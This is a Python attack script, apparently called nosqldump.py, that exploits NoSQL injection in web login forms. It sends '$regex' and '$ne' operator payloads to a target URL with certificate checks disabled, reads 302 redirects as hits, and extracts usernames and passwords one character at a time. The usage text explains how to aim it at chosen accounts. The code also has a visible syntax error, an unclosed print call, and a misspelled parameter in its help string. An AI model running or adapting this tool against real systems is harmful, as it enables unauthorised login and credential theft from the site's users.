import requests
import urllib3
import string
import urllib, argparse
urllib3.disable_warnings()

url=""
headers={"content-type":"application/x-www-form-urlencoded"}

def brute_force_inj(payload, target):
    for c in string.printable:
        targ = target
        payloadLocal = payload.format(targ + sanitize(c))
        r = requests.post(url, data=payloadLocal, headers=headers, verify=False, allow_redirects=False)
        if r.status_code == 302:
            print("Found one more char: {}".format(targ + c))
            target = brute_force_inj(payload, targ+c)
            return target
    return target

def sanitize(char):
    if char in ['*','+','.','?','|', '#', '&', '$', '^']:
        return "\\" + char
    return char

def list_brute(payload, one=False):
    print("Start brute")
    llist = list()
    for i in string.printable:
        payloadLocal = payload.format(sanitize(i))
        print("payloadLocal : {}".format(payloadLocal))
        r = requests.post(url,data=payloadLocal, headers=headers, verify=False, allow_redirects=False)
        if r.status_code == 302:
            print("Username starts with: {}".format(i))
            item = brute_force_inj(payload, sanitize(i))
            llist.append(item)
            if one:
                return llist
    return llist

def brute_password(payload, username):
    payloadLocal = payload.format(username)
    password = list_brute(payloadLocal, one=True)
    return password

if __name__ == '__main__':
    print("USAGE: python3 nosqldump.py -p \"username[\$regex]=^{}&password[\$ne]=tamtam&login=login\" -u user1 -u USER2\n For password enum use username={}&passowrd[\$regex]={{}}...."
    parser = argparse.ArgumentParser()
    parser.add_argument('-p','--payload', required=True, type=str, help="payload to inject. should have {} for user enumeration and have {} and {{}} for password dump")
    parser.add_argument('-u','--usernames', required=True, action='append', help="usernames like: '-u user -u anotheruser'")
    args = parser.parse_args()
    
    if args.payload:
        print(args.payload)
        if args.usernames:
            for i in args.usernames:
                print(args.payload.format("ss"))
                passw = brute_password(args.payload, i)
                print("{} : {}".format(i,passw))
        else:
            print(list_brute(args.payload))
